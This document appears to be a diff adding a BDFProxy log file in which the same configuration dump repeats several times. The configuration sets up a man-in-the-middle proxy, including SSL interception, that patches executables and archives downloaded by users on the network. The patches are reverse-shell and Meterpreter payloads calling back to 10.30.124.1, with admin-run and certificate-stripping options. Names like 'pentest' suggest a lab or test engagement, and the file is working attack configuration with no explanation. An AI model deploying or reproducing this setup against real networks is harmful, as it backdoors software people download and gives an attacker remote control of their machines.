+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
+                "PORT": "8888", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxType": "ALL", 
+            "MachoIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "5555", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "MachoIntelx86": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "4444", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "WindowsIntelx64": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
+                "PATCH_DLL": "True", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8088", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "pentest_x64_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsIntelx86": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
+                "PATCH_DLL": "False", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8090", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "veil_go_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "XP_MODE": "True", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }, 
+        "sourceforge.org": {
+            "CompressedFiles": "False", 
+            "WindowsIntelx64": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsType": "x64"
+        }, 
+        "sysinternals.com": {
+            "CompressedFiles": "False", 
+            "LinuxType": "None", 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }
+    }
+}
+2018-10-25 17:46:55,984 [*] ################ Starting BDFProxy ################
+2018-10-25 17:46:55,991 [*] ConfigDump {
+    "Overall": {
+        "MaxSizeFileRequested": "100000000", 
+        "certLocation": "~/.mitmproxy/mitmproxy-ca.pem", 
+        "loglevel": "INFO", 
+        "logname": "proxy.log", 
+        "proxyMode": "regular", 
+        "proxyPort": "8080", 
+        "resourceScriptFile": "bdfproxy_msf_resource.rc", 
+        "sslports": [
+            "443", 
+            "8443"
+        ]
+    }, 
+    "TAR": {
+        "blacklist": [], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "ZIP": {
+        "blacklist": [
+            ".dll"
+        ], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "hosts": {
+        "blacklist": [], 
+        "whitelist": "ALL"
+    }, 
+    "keywords": {
+        "blacklist": ".dll", 
+        "whitelist": "ALL"
+    }, 
+    "targets": {
+        "ALL": {
+            "CompressedFiles": "True", 
+            "FatPriority": "x64", 
+            "FileSizeMax": "10000000", 
+            "LinuxIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "9999", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxIntelx86": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
+                "PORT": "8888", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxType": "ALL", 
+            "MachoIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "5555", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "MachoIntelx86": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "4444", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "WindowsIntelx64": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
+                "PATCH_DLL": "True", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8088", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "pentest_x64_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsIntelx86": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
+                "PATCH_DLL": "False", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8090", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "veil_go_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "XP_MODE": "True", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }, 
+        "sourceforge.org": {
+            "CompressedFiles": "False", 
+            "WindowsIntelx64": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsType": "x64"
+        }, 
+        "sysinternals.com": {
+            "CompressedFiles": "False", 
+            "LinuxType": "None", 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }
+    }
+}
+2018-10-25 17:48:19,016 [*] ################ Starting BDFProxy ################
+2018-10-25 17:48:19,019 [*] ConfigDump {
+    "Overall": {
+        "MaxSizeFileRequested": "100000000", 
+        "certLocation": "~/.mitmproxy/mitmproxy-ca.pem", 
+        "loglevel": "INFO", 
+        "logname": "proxy.log", 
+        "proxyMode": "regular", 
+        "proxyPort": "8080", 
+        "resourceScriptFile": "bdfproxy_msf_resource.rc", 
+        "sslports": [
+            "443", 
+            "8443"
+        ]
+    }, 
+    "TAR": {
+        "blacklist": [], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "ZIP": {
+        "blacklist": [
+            ".dll"
+        ], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "hosts": {
+        "blacklist": [], 
+        "whitelist": "ALL"
+    }, 
+    "keywords": {
+        "blacklist": ".dll", 
+        "whitelist": "ALL"
+    }, 
+    "targets": {
+        "ALL": {
+            "CompressedFiles": "True", 
+            "FatPriority": "x64", 
+            "FileSizeMax": "10000000", 
+            "LinuxIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "9999", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxIntelx86": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
+                "PORT": "8888", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxType": "ALL", 
+            "MachoIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "5555", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "MachoIntelx86": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "4444", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "WindowsIntelx64": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
+                "PATCH_DLL": "True", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8088", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "pentest_x64_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsIntelx86": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
+                "PATCH_DLL": "False", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8090", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "veil_go_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "XP_MODE": "True", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }, 
+        "sourceforge.org": {
+            "CompressedFiles": "False", 
+            "WindowsIntelx64": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsType": "x64"
+        }, 
+        "sysinternals.com": {
+            "CompressedFiles": "False", 
+            "LinuxType": "None", 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }
+    }
+}
+2018-10-25 18:26:02,734 [*] ################ Starting BDFProxy ################
+2018-10-25 18:26:02,764 [*] ConfigDump {
+    "Overall": {
+        "MaxSizeFileRequested": "100000000", 
+        "certLocation": "~/.mitmproxy/mitmproxy-ca.pem", 
+        "loglevel": "INFO", 
+        "logname": "proxy.log", 
+        "proxyMode": "regular", 
+        "proxyPort": "8080", 
+        "resourceScriptFile": "bdfproxy_msf_resource.rc", 
+        "sslports": [
+            "443", 
+            "8443"
+        ]
+    }, 
+    "TAR": {
+        "blacklist": [], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "ZIP": {
+        "blacklist": [
+            ".dll"
+        ], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "hosts": {
+        "blacklist": [], 
+        "whitelist": "ALL"
+    }, 
+    "keywords": {
+        "blacklist": ".dll", 
+        "whitelist": "ALL"
+    }, 
+    "targets": {
+        "ALL": {
+            "CompressedFiles": "True", 
+            "FatPriority": "x64", 
+            "FileSizeMax": "10000000", 
+            "LinuxIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "9999", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxIntelx86": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
+                "PORT": "8888", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxType": "ALL", 
+            "MachoIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "5555", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "MachoIntelx86": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "4444", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "WindowsIntelx64": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
+                "PATCH_DLL": "True", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8088", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "pentest_x64_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsIntelx86": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
+                "PATCH_DLL": "False", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8090", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "veil_go_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "XP_MODE": "True", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }, 
+        "sourceforge.org": {
+            "CompressedFiles": "False", 
+            "WindowsIntelx64": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsType": "x64"
+        }, 
+        "sysinternals.com": {
+            "CompressedFiles": "False", 
+            "LinuxType": "None", 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }
+    }
+}
+2018-10-25 18:30:53,050 [*] ################ Starting BDFProxy ################
+2018-10-25 18:30:53,054 [*] ConfigDump {
+    "Overall": {
+        "MaxSizeFileRequested": "100000000", 
+        "certLocation": "~/.mitmproxy/mitmproxy-ca.pem", 
+        "loglevel": "INFO", 
+        "logname": "proxy.log", 
+        "proxyMode": "regular", 
+        "proxyPort": "8080", 
+        "resourceScriptFile": "bdfproxy_msf_resource.rc", 
+        "sslports": [
+            "443", 
+            "8443"
+        ]
+    }, 
+    "TAR": {
+        "blacklist": [], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "ZIP": {
+        "blacklist": [
+            ".dll"
+        ], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "hosts": {
+        "blacklist": [], 
+        "whitelist": "ALL"
+    }, 
+    "keywords": {
+        "blacklist": ".dll", 
+        "whitelist": "ALL"
+    }, 
+    "targets": {
+        "ALL": {
+            "CompressedFiles": "True", 
+            "FatPriority": "x64", 
+            "FileSizeMax": "10000000", 
+            "LinuxIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "9999", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxIntelx86": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
+                "PORT": "8888", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxType": "ALL", 
+            "MachoIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "5555", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "MachoIntelx86": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "4444", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "WindowsIntelx64": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
+                "PATCH_DLL": "True", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8088", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "pentest_x64_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsIntelx86": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
+                "PATCH_DLL": "False", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8090", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "veil_go_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "XP_MODE": "True", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }, 
+        "sourceforge.org": {
+            "CompressedFiles": "False", 
+            "WindowsIntelx64": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsType": "x64"
+        }, 
+        "sysinternals.com": {
+            "CompressedFiles": "False", 
+            "LinuxType": "None", 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }
+    }
+}
